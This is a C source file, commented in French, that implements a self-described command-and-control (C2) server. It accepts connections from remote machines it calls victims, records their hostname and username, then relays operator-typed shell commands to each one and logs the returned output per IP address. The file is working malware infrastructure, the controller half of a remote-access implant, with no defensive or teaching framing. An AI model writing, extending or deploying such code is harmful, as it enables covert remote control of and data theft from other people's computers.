#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <signal.h>
#include <netdb.h>
#include <errno.h>
#include <time.h>
#include <dirent.h>

#define PORT 8080
#define BUFFER_SIZE 1024
#define CLIENT_DIR "clients"
#define LOG_FILE "./server.log"
#define LOG_DIR "clients_logs"

int server_socket = -1; // Variable pour stocker le socket du serveur

// Fonction pour écrire dans le fichier log principal
void write_log(const char *message) {
    FILE *log_file = fopen(LOG_FILE, "a");
    if (log_file) {
        time_t now = time(NULL);
        char *timestamp = ctime(&now);
        timestamp[strlen(timestamp) - 1] = '\0'; // Supprimer le caractère '\n'
        fprintf(log_file, "[%s] %s\n", timestamp, message);
        fclose(log_file);
    } else {
        perror("Erreur d'ouverture du fichier log");
    }
}

// Fonction pour initialiser un fichier log pour chaque client
void init_client_log(const char *client_ip) {
    char log_filename[BUFFER_SIZE];
    snprintf(log_filename, sizeof(log_filename), "%s/%s.txt", LOG_DIR, client_ip);

    FILE *file = fopen(log_filename, "a");
    if (file) {
        time_t now = time(NULL);
        char *timestamp = ctime(&now);
        timestamp[strlen(timestamp) - 1] = '\0'; // Supprimer le caractère '\n'
        fprintf(file, "=== Connexion du client %s à %s ===\n", client_ip, timestamp);
        fclose(file);
    }
}

// Fonction pour loguer les données spécifiques du client
void log_client_data(const char *client_ip, const char *data) {
    char log_filename[BUFFER_SIZE];
    snprintf(log_filename, sizeof(log_filename), "%s/%s.txt", LOG_DIR, client_ip);

    FILE *file = fopen(log_filename, "a");
    if (file) {
        time_t now = time(NULL);
        char *timestamp = ctime(&now);
        timestamp[strlen(timestamp) - 1] = '\0'; // Supprimer le caractère '\n'
        fprintf(file, "[%s] %s\n", timestamp, data);
        fclose(file);
    }
}

// Fonction pour gérer les connexions clients
void *client_handler(void *client_socket) {
    int sock = *(int *)client_socket;
    free(client_socket);

    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE];
    char client_ip[INET_ADDRSTRLEN];
    char hostname[BUFFER_SIZE], username[BUFFER_SIZE];

    // Récupérer l'IP du client
    if (getpeername(sock, (struct sockaddr *)&client_addr, &addr_len) == -1) {
        perror("Erreur récupération IP client");
        close(sock);
        return NULL;
    }
    inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));

    printf("Client connecté : %s\n", client_ip);

    // Créer le dossier clients si inexistant
    mkdir(LOG_DIR, 0777);

    // Initialiser le fichier log du client avec la date de connexion
    init_client_log(client_ip);

    // Attendre les informations de la victime (Hostname et Username)
    memset(buffer, 0, BUFFER_SIZE);
    int bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received <= 0) {
        if (bytes_received == 0) {
            printf("Client déconnecté.\n");
        } else {
            perror("Erreur de réception des informations client");
        }
        close(sock);
        return NULL;
    }

    buffer[bytes_received] = '\0';
    sscanf(buffer, "Hostname: %s\nUsername: %s", hostname, username);
    printf("Hostname: %s\nUsername: %s\n", hostname, username);

    // Loguer les informations du client (Hostname et Username)
    char log_entry[BUFFER_SIZE];
    snprintf(log_entry, sizeof(log_entry), "Hostname: %s\nUsername: %s", hostname, username);
    log_client_data(client_ip, log_entry);

    // Boucle pour envoyer les commandes après réception des informations
    while (1) {
        // Attendre une commande depuis l'utilisateur du serveur
        printf("Entrer une commande à envoyer : ");
        fgets(buffer, BUFFER_SIZE, stdin);

        // Supprimer le '\n' à la fin
        buffer[strcspn(buffer, "\n")] = 0;

        // Logger la commande
        snprintf(log_entry, sizeof(log_entry), "Commande envoyée : %s", buffer);
        log_client_data(client_ip, log_entry);

        // Envoyer la commande au client
        if (send(sock, buffer, strlen(buffer), 0) == -1) {
            perror("Erreur d'envoi");
            break;
        }

        // Attendre une réponse du client
        memset(buffer, 0, BUFFER_SIZE);
        int total_bytes_received = 0;
        char temp_buffer[BUFFER_SIZE];

        while (1) {
            // Recevoir des données du client
            int bytes_received = recv(sock, temp_buffer, sizeof(temp_buffer) - 1, 0);
            if (bytes_received <= 0) {
                if (bytes_received == 0) {
                    printf("Client déconnecté.\n");
                } else {
                    perror("Erreur de réception");
                }
                close(sock);
                return NULL;
            }

            total_bytes_received += bytes_received;
            temp_buffer[bytes_received] = '\0'; // Ajouter le caractère de fin de chaîne

            // Ajouter ce qui a été reçu dans le buffer complet
            strncat(buffer, temp_buffer, sizeof(buffer) - strlen(buffer) - 1);

            // Si la réponse est terminée, on sort de la boucle
            if (bytes_received < sizeof(temp_buffer) - 1) {
                break;
            }
        }

        // Afficher la réponse complète du client
        printf("Réponse du client : %s\n", buffer);

        // Logger la réponse
        log_client_data(client_ip, buffer);
    }

    close(sock);
    return NULL;
}

// Fonction pour démarrer le serveur
void start_server() {
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size = sizeof(client_addr);

    write_log("Démarrage du serveur C2...");

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("Erreur de création du socket");
        write_log("Erreur de création du socket.");
        exit(1);
    }

    // Permettre de réutiliser immédiatement le port après l'arrêt du serveur
    int opt = 1;
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) != 0) {
        perror("Erreur de setsockopt");
        write_log("Erreur de setsockopt (SO_REUSEADDR).");
        close(server_socket);
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Erreur de liaison");
        write_log("Erreur de liaison du socket.");
        close(server_socket);
        exit(1);
    }

    if (listen(server_socket, 10) < 0) {
        perror("Erreur d'écoute");
        write_log("Erreur d'écoute sur le socket.");
        close(server_socket);
        exit(1);
    }

    printf("Serveur C2 en attente de connexions sur le port %d...\n", PORT);
    write_log("Serveur C2 prêt à accepter des connexions.");

    while (1) {
        int client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &addr_size);
        if (client_socket < 0) {
            perror("Erreur d'acceptation");
            write_log("Erreur d'acceptation d'une connexion client.");
            continue;
        }

        pthread_t thread_id;
        int *new_sock = malloc(sizeof(int));
        if (!new_sock) {
            perror("Erreur d'allocation mémoire");
            write_log("Erreur d'allocation mémoire pour un nouveau client.");
            close(client_socket);
            continue;
        }
        *new_sock = client_socket;

        if (pthread_create(&thread_id, NULL, client_handler, (void *)new_sock) != 0) {
            perror("Erreur de création de thread");
            write_log("Erreur de création de thread pour un client.");
            free(new_sock);
            close(client_socket);
        }

        pthread_detach(thread_id);
    }
}

// Fonction pour arrêter le serveur
void stop_server() {
    if (server_socket != -1) {
        close(server_socket);
        server_socket = -1;
        write_log("Serveur arrêté.");
    } else {
        write_log("Le serveur n'était pas en cours d'exécution.");
    }
}

void handle_signal(int signal) {
    if (signal == SIGINT) {
        write_log("Arrêt du serveur par SIGINT (Ctrl+C).");
        stop_server();
        exit(0);
    }
}

int main() {
    signal(SIGINT, handle_signal); // Capturer SIGINT pour un arrêt propre

    // Lancer le serveur
    start_server();

    return 0;
}
